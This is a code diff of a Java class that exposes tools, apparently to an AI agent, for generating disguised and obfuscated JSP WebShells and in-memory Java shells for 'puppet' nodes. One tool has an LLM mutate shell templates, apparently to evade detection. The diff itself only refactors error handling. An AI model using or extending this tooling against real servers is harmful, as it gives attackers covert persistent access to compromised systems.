@@ -21,7 +21,6 @@ import org.leo.service.shell.ShellResultStore;
 import org.springframework.stereotype.Component;
 
 import java.util.Arrays;
-import java.util.HashMap;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
@@ -91,7 +90,7 @@ public class ShellGeneratorTools {
           "打包器类型（packerType）及分组层级、各 Packer 支持的混淆步骤 ID，以及全量 JSP 混淆步骤描述列表。" +
           "生成 WebShell 或内存马前，调用此工具确认合法参数范围。")
     public Map<String, Object> getShellGeneratorMeta() {
-        Map<String, Object> data = new HashMap<>();
+        Map<String, Object> data = new LinkedHashMap<>();
         data.put("serverInjectorTypes", ServerInjectorMapper.getAllServerInjectorMapAsString());
         data.put("packerTypes", ServerInjectorMapper.getSupportedPackerTypesHierarchy());
         data.put("packerObfuscationSteps", PackerRegistry.getPackerObfuscationStepsMap());
@@ -104,36 +103,32 @@ public class ShellGeneratorTools {
           "生成 WebShell 或内存马前必须调用此工具，确保生成的 shell 与当前傀儡节点通信协议完全匹配，" +
           "避免因协议或伪装器不匹配导致 shell 无法使用。" +
           "如果用户未明确指定 puppetId，请先通过 getAllPuppet 工具获取可用节点列表后再调用本工具。")
-    public Map<String, Object> getPuppetShellConfig(String puppetId) {
-        try {
-            if (isBlank(puppetId)) throw new IllegalArgumentException("puppetId 不能为空");
-            Puppet puppet = puppetService.findPuppetById(puppetId.trim());
-            if (puppet == null) throw new IllegalArgumentException("Puppet 不存在: " + puppetId);
+    public Map<String, Object> getPuppetShellConfig(String puppetId) throws Exception {
+        if (isBlank(puppetId)) throw new IllegalArgumentException("puppetId 不能为空");
+        Puppet puppet = puppetService.findPuppetById(puppetId.trim());
+        if (puppet == null) throw new IllegalArgumentException("Puppet 不存在: " + puppetId);
 
-            Map<String, Object> result = new LinkedHashMap<>();
-            result.put("success",       true);
-            result.put("puppetId",      puppet.getPuppetId());
-            result.put("puppetName",    puppet.getPuppetName());
-            result.put("protocol",      puppet.getProtocol() != null ? puppet.getProtocol() : "http");
-            result.put("reqDisguiseId", puppet.getReqDisguiseId());
-            result.put("respDisguiseId", puppet.getRespDisguiseId());
+        Map<String, Object> result = new LinkedHashMap<>();
+        result.put("success",       true);
+        result.put("puppetId",      puppet.getPuppetId());
+        result.put("puppetName",    puppet.getPuppetName());
+        result.put("protocol",      puppet.getProtocol() != null ? puppet.getProtocol() : "http");
+        result.put("reqDisguiseId", puppet.getReqDisguiseId());
+        result.put("respDisguiseId", puppet.getRespDisguiseId());
 
-            // 补充伪装器名称，方便 AI 理解上下文
-            if (!isBlank(puppet.getReqDisguiseId())) {
-                Disguise req = disguiseService.getDisguiseById(puppet.getReqDisguiseId());
-                result.put("reqDisguiseName", req != null ? req.getDisguiseName() : "unknown");
-            }
-            if (!isBlank(puppet.getRespDisguiseId())) {
-                Disguise resp = disguiseService.getDisguiseById(puppet.getRespDisguiseId());
-                result.put("respDisguiseName", resp != null ? resp.getDisguiseName() : "unknown");
-            }
-
-            result.put("tip", "请将 protocol、reqDisguiseId、respDisguiseId 直接传入 generateWebShell 或 generateMemoryShell，" +
-                    "确保生成的 shell 与该傀儡节点通信协议完全一致。");
-            return result;
-        } catch (Exception e) {
-            return failureResult("getPuppetShellConfig", e);
+        // 补充伪装器名称，方便 AI 理解上下文
+        if (!isBlank(puppet.getReqDisguiseId())) {
+            Disguise req = disguiseService.getDisguiseById(puppet.getReqDisguiseId());
+            result.put("reqDisguiseName", req != null ? req.getDisguiseName() : "unknown");
         }
+        if (!isBlank(puppet.getRespDisguiseId())) {
+            Disguise resp = disguiseService.getDisguiseById(puppet.getRespDisguiseId());
+            result.put("respDisguiseName", resp != null ? resp.getDisguiseName() : "unknown");
+        }
+
+        result.put("tip", "请将 protocol、reqDisguiseId、respDisguiseId 直接传入 generateWebShell 或 generateMemoryShell，" +
+                "确保生成的 shell 与该傀儡节点通信协议完全一致。");
+        return result;
     }
 
     // ── AI 辅助模板变异 ──────────────────────────────────────────────────────────
@@ -148,49 +143,44 @@ public class ShellGeneratorTools {
     public Map<String, Object> mutateJspTemplate(
             String packerType,
             Boolean byPassJavaModule,
-            String mutationHint) {
-        try {
-            String baseTemplate = resolveBaseTemplate(packerType, byPassJavaModule);
+            String mutationHint) throws Exception {
+        String baseTemplate = resolveBaseTemplate(packerType, byPassJavaModule);
 
-            String mutated = null;
-            String lastError = null;
-            int maxAttempts = 3;
+        String mutated = null;
+        String lastError = null;
+        int maxAttempts = 3;
 
-            for (int attempt = 1; attempt <= maxAttempts; attempt++) {
-                String userPrompt = buildMutationPrompt(baseTemplate, mutationHint, lastError);
-                ChatRequest request = ChatRequest.builder()
-                        .messages(Arrays.asList(
-                                SystemMessage.from(TEMPLATE_SYNTAX_GUIDE),
-                                UserMessage.from(userPrompt)
-                        ))
-                        .build();
-                ChatResponse response = chatModel.chat(request);
-                String raw = response.aiMessage().text();
-                if (raw == null) raw = "";
-                mutated = stripCodeFences(raw.trim());
+        for (int attempt = 1; attempt <= maxAttempts; attempt++) {
+            String userPrompt = buildMutationPrompt(baseTemplate, mutationHint, lastError);
+            ChatRequest request = ChatRequest.builder()
+                    .messages(Arrays.asList(
+                            SystemMessage.from(TEMPLATE_SYNTAX_GUIDE),
+                            UserMessage.from(userPrompt)
+                    ))
+                    .build();
+            ChatResponse response = chatModel.chat(request);
+            String raw = response.aiMessage().text();
+            if (raw == null) raw = "";
+            mutated = stripCodeFences(raw.trim());
 
-                try {
-                    validateMutatedTemplate(mutated);
-                    break; // 验证通过，退出重试
-                } catch (IllegalStateException e) {
-                    lastError = e.getMessage();
-                    if (attempt == maxAttempts) {
-                        throw new IllegalStateException(
-                                "经过 " + maxAttempts + " 次尝试仍未生成合法模板，最后一次错误：" + lastError);
-                    }
+            try {
+                validateMutatedTemplate(mutated);
+                break; // 验证通过，退出重试
+            } catch (IllegalStateException e) {
+                lastError = e.getMessage();
+                if (attempt == maxAttempts) {
+                    throw new IllegalStateException(
+                            "经过 " + maxAttempts + " 次尝试仍未生成合法模板，最后一次错误：" + lastError);
                 }
             }
-
-            Map<String, Object> result = new HashMap<>();
-            result.put("success", true);
-            result.put("mutatedTemplate", mutated);
-            result.put("summary", "结构变异完成，模板长度 " + mutated.length()
-                    + " 字符。将 mutatedTemplate 传入 generateMemoryShell 的 customJspTemplate 参数即可使用。");
-            return result;
-
-        } catch (Exception e) {
-            return failureResult("mutateJspTemplate", e);
         }
+
+        Map<String, Object> result = new LinkedHashMap<>();
+        result.put("success", true);
+        result.put("mutatedTemplate", mutated);
+        result.put("summary", "结构变异完成，模板长度 " + mutated.length()
+                + " 字符。将 mutatedTemplate 传入 generateMemoryShell 的 customJspTemplate 参数即可使用。");
+        return result;
     }
 
     // ── WebShell 生成 ───────────────────────────────────────────────────────────
@@ -212,54 +202,49 @@ public class ShellGeneratorTools {
             String coreClassName,
             String protocol,
             Integer respCode,
-            List<String> jspObfuscationSteps) {
-        try {
-            Disguise reqDisguise  = requireDisguise(reqDisguiseId,  "reqDisguiseId");
-            Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
+            List<String> jspObfuscationSteps) throws Exception {
+        Disguise reqDisguise  = requireDisguise(reqDisguiseId,  "reqDisguiseId");
+        Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
 
-            String shellTypeUpper = requireNonBlank(shellType, "shellType").toUpperCase();
-            if (!"JSP".equals(shellTypeUpper) && !"JSPX".equals(shellTypeUpper)) {
-                throw new IllegalArgumentException("shellType 必须是 JSP 或 JSPX，当前值: " + shellType);
-            }
-
-            ShellGeneratorConfig.Builder builder = ShellGeneratorConfig
-                    .builder(reqDisguise, respDisguise)
-                    .respCode(respCode != null ? respCode : 200);
-
-            if (!isBlank(protocol))      builder.protocol(protocol.trim());
-            if (!isBlank(coreClassName)) builder.coreClassName(coreClassName.trim());
-            if (jspObfuscationSteps != null) builder.jspObfuscationSteps(jspObfuscationSteps);
-
-            ShellGeneratorConfig config = builder.build();
-            ShellGenerator generator = new ShellGenerator(config);
-
-            String shell = "JSP".equals(shellTypeUpper)
-                    ? generator.generateJspShell()
-                    : generator.generateJspxShell();
-
-            // 摘要（不含完整代码）
-            Map<String, Object> meta = new LinkedHashMap<>();
-            meta.put("type",          shellTypeUpper);
-            meta.put("coreClassName", config.getCoreClassName());
-            meta.put("protocol",      config.getProtocol());
-            meta.put("lines",         shell.split("\n").length);
-            meta.put("chars",         shell.length());
-
-            String resultId = resultStore.put(shell, meta);
-
-            Map<String, Object> result = new LinkedHashMap<>();
-            result.put("success",   true);
-            result.put("resultId",  resultId);
-            result.put("fetchUrl",  "/platform/shell-generator/result/" + resultId);
-            result.put("meta",      meta);
-            result.put("tip",       "完整代码已缓存（30 分钟有效）。" +
-                    "请在回复正文中嵌入以下按钮语法，让用户可以直接在对话中取回代码：" +
-                    "[[shell-result:" + resultId + ":取回 WebShell 代码]]");
-            return result;
-
-        } catch (Exception e) {
-            return failureResult("generateWebShell", e);
+        String shellTypeUpper = requireNonBlank(shellType, "shellType").toUpperCase();
+        if (!"JSP".equals(shellTypeUpper) && !"JSPX".equals(shellTypeUpper)) {
+            throw new IllegalArgumentException("shellType 必须是 JSP 或 JSPX，当前值: " + shellType);
         }
+
+        ShellGeneratorConfig.Builder builder = ShellGeneratorConfig
+                .builder(reqDisguise, respDisguise)
+                .respCode(respCode != null ? respCode : 200);
+
+        if (!isBlank(protocol))      builder.protocol(protocol.trim());
+        if (!isBlank(coreClassName)) builder.coreClassName(coreClassName.trim());
+        if (jspObfuscationSteps != null) builder.jspObfuscationSteps(jspObfuscationSteps);
+
+        ShellGeneratorConfig config = builder.build();
+        ShellGenerator generator = new ShellGenerator(config);
+
+        String shell = "JSP".equals(shellTypeUpper)
+                ? generator.generateJspShell()
+                : generator.generateJspxShell();
+
+        // 摘要（不含完整代码）
+        Map<String, Object> meta = new LinkedHashMap<>();
+        meta.put("type",          shellTypeUpper);
+        meta.put("coreClassName", config.getCoreClassName());
+        meta.put("protocol",      config.getProtocol());
+        meta.put("lines",         shell.split("\n").length);
+        meta.put("chars",         shell.length());
+
+        String resultId = resultStore.put(shell, meta);
+
+        Map<String, Object> result = new LinkedHashMap<>();
+        result.put("success",   true);
+        result.put("resultId",  resultId);
+        result.put("fetchUrl",  "/platform/shell-generator/result/" + resultId);
+        result.put("meta",      meta);
+        result.put("tip",       "完整代码已缓存（30 分钟有效）。" +
+                "请在回复正文中嵌入以下按钮语法，让用户可以直接在对话中取回代码：" +
+                "[[shell-result:" + resultId + ":取回 WebShell 代码]]");
+        return result;
     }
 
     // ── 内存马生成 ──────────────────────────────────────────────────────────────
@@ -296,69 +281,64 @@ public class ShellGeneratorTools {
             Boolean byPassJavaModule,
             Integer respCode,
             List<String> jspObfuscationSteps,
-            String customJspTemplate) {
-        try {
-            Disguise reqDisguise  = requireDisguise(reqDisguiseId,  "reqDisguiseId");
-            Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
+            String customJspTemplate) throws Exception {
+        Disguise reqDisguise  = requireDisguise(reqDisguiseId,  "reqDisguiseId");
+        Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
 
-            ShellGeneratorConfig.Builder builder = ShellGeneratorConfig
-                    .builder(reqDisguise, respDisguise)
-                    .header(requireNonBlank(headerName,  "headerName"),
-                            requireNonBlank(headerValue, "headerValue"))
-                    .serverType(requireNonBlank(serverType, "serverType"))
-                    .shellType(requireNonBlank(shellType,   "shellType"))
-                    .packerType(requireNonBlank(packerType, "packerType"))
-                    .urlPattern(isBlank(urlPattern) ? "/*" : urlPattern.trim())
-                    .abstractTranslet(isAbstractTranslet != null && isAbstractTranslet)
-                    .respCode(respCode != null ? respCode : 200);
+        ShellGeneratorConfig.Builder builder = ShellGeneratorConfig
+                .builder(reqDisguise, respDisguise)
+                .header(requireNonBlank(headerName,  "headerName"),
+                        requireNonBlank(headerValue, "headerValue"))
+                .serverType(requireNonBlank(serverType, "serverType"))
+                .shellType(requireNonBlank(shellType,   "shellType"))
+                .packerType(requireNonBlank(packerType, "packerType"))
+                .urlPattern(isBlank(urlPattern) ? "/*" : urlPattern.trim())
+                .abstractTranslet(isAbstractTranslet != null && isAbstractTranslet)
+                .respCode(respCode != null ? respCode : 200);
 
-            if (!isBlank(protocol))          builder.protocol(protocol.trim());
-            if (byPassJavaModule != null)    builder.byPassJavaModule(byPassJavaModule);
-            if (jspObfuscationSteps != null) builder.jspObfuscationSteps(jspObfuscationSteps);
-            if (!isBlank(customJspTemplate)) builder.customJspTemplate(customJspTemplate.trim());
+        if (!isBlank(protocol))          builder.protocol(protocol.trim());
+        if (byPassJavaModule != null)    builder.byPassJavaModule(byPassJavaModule);
+        if (jspObfuscationSteps != null) builder.jspObfuscationSteps(jspObfuscationSteps);
+        if (!isBlank(customJspTemplate)) builder.customJspTemplate(customJspTemplate.trim());
 
-            builder.coreClassName(isBlank(coreClassName)
-                    ? ClassNameGenerator.generateServletStyleClassName() : coreClassName.trim());
-            builder.injectorClassName(isBlank(injectorClassName)
-                    ? ClassNameGenerator.generateServletStyleClassName() : injectorClassName.trim());
-            builder.shellClassName(isBlank(shellClassName)
-                    ? ClassNameGenerator.generateServletStyleClassName() : shellClassName.trim());
+        builder.coreClassName(isBlank(coreClassName)
+                ? ClassNameGenerator.generateServletStyleClassName() : coreClassName.trim());
+        builder.injectorClassName(isBlank(injectorClassName)
+                ? ClassNameGenerator.generateServletStyleClassName() : injectorClassName.trim());
+        builder.shellClassName(isBlank(shellClassName)
+                ? ClassNameGenerator.generateServletStyleClassName() : shellClassName.trim());
 
-            ShellGeneratorConfig config = builder.build();
-            ShellGenerator generator = new ShellGenerator(config);
-            String code = generator.generateFormattedInjector();
+        ShellGeneratorConfig config = builder.build();
+        ShellGenerator generator = new ShellGenerator(config);
+        String code = generator.generateFormattedInjector();
 
-            // 摘要（不含完整代码）
-            Map<String, Object> meta = new LinkedHashMap<>();
-            meta.put("packerType",        config.getPackerType());
-            meta.put("shellType",         config.getShellType());
-            meta.put("serverType",        config.getServerType());
-            meta.put("coreClassName",     config.getCoreClassName());
-            meta.put("injectorClassName", config.getInjectorClassName());
-            meta.put("shellClassName",    config.getShellClassName());
-            meta.put("urlPattern",        config.getUrlPattern());
-            meta.put("isAbstractTranslet", config.isAbstractTranslet());
-            meta.put("byPassJavaModule",  config.isByPassJavaModule());
-            meta.put("headerConfig",      headerName + " : " + headerValue);
-            meta.put("templateMutated",   !isBlank(customJspTemplate));
-            meta.put("lines",             code.split("\n").length);
-            meta.put("chars",             code.length());
+        // 摘要（不含完整代码）
+        Map<String, Object> meta = new LinkedHashMap<>();
+        meta.put("packerType",        config.getPackerType());
+        meta.put("shellType",         config.getShellType());
+        meta.put("serverType",        config.getServerType());
+        meta.put("coreClassName",     config.getCoreClassName());
+        meta.put("injectorClassName", config.getInjectorClassName());
+        meta.put("shellClassName",    config.getShellClassName());
+        meta.put("urlPattern",        config.getUrlPattern());
+        meta.put("isAbstractTranslet", config.isAbstractTranslet());
+        meta.put("byPassJavaModule",  config.isByPassJavaModule());
+        meta.put("headerConfig",      headerName + " : " + headerValue);
+        meta.put("templateMutated",   !isBlank(customJspTemplate));
+        meta.put("lines",             code.split("\n").length);
+        meta.put("chars",             code.length());
 
-            String resultId = resultStore.put(code, meta);
+        String resultId = resultStore.put(code, meta);
 
-            Map<String, Object> result = new LinkedHashMap<>();
-            result.put("success",  true);
-            result.put("resultId", resultId);
-            result.put("fetchUrl", "/platform/shell-generator/result/" + resultId);
-            result.put("meta",     meta);
-            result.put("tip",      "完整代码已缓存（30 分钟有效）。" +
-                    "请在回复正文中嵌入以下按钮语法，让用户可以直接在对话中取回代码：" +
-                    "[[shell-result:" + resultId + ":取回内存马代码]]");
-            return result;
-
-        } catch (Exception e) {
-            return failureResult("generateMemoryShell", e);
-        }
+        Map<String, Object> result = new LinkedHashMap<>();
+        result.put("success",  true);
+        result.put("resultId", resultId);
+        result.put("fetchUrl", "/platform/shell-generator/result/" + resultId);
+        result.put("meta",     meta);
+        result.put("tip",      "完整代码已缓存（30 分钟有效）。" +
+                "请在回复正文中嵌入以下按钮语法，让用户可以直接在对话中取回代码：" +
+                "[[shell-result:" + resultId + ":取回内存马代码]]");
+        return result;
     }
 
     // ── 私有工具方法 ───────────────────────────────────────────────────────────
@@ -432,20 +412,5 @@ public class ShellGeneratorTools {
 
     private boolean isBlank(String value) {
         return value == null || value.isBlank();
-    }
-
-    private Map<String, Object> failureResult(String operation, Exception e) {
-        Throwable root = e;
-        while (root.getCause() != null && root.getCause() != root) root = root.getCause();
-        Map<String, Object> result = new LinkedHashMap<>();
-        result.put("success",   false);
-        result.put("operation", operation);
-        result.put("errorType", e.getClass().getSimpleName());
-        result.put("message",   e.getMessage() != null ? e.getMessage() : e.getClass().getName());
-        if (root != e) {
-            result.put("rootCauseType",    root.getClass().getSimpleName());
-            result.put("rootCauseMessage", root.getMessage() != null ? root.getMessage() : root.getClass().getName());
-        }
-        return result;
     }
 }
